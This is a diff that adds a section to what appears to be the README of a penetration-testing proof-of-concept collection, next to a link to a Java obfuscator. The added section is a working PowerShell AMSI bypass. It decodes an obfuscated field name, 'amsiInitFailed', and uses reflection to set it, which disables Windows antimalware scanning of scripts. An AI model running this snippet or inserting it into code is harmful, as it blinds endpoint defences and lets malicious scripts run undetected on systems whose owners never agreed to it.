@@ -1,3 +1,16 @@
+[!(https://github.com/Mr-xn/Penetration_Testing_POC/raw/master/img/AMSI_TN_bypass.jpg)]
+
+````
+
+$a =[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') 
+$h="4456625220575263174452554847" 
+$s =[string](0..13|%{[char][int](53+($h).substring(($_*2),2))})-replace " " 
+$b =$a.GetField($s,'NonPublic,Static') $b.SetValue($null,$true)
+
+
+````
+
+
 #### java obfuscator (GUI)
 [![java obfuscator](https://i.postimg.cc/NMfLk5Hb/2020-05-22-182054.png)](https://github.com/superblaubeere27/obfuscator)
 
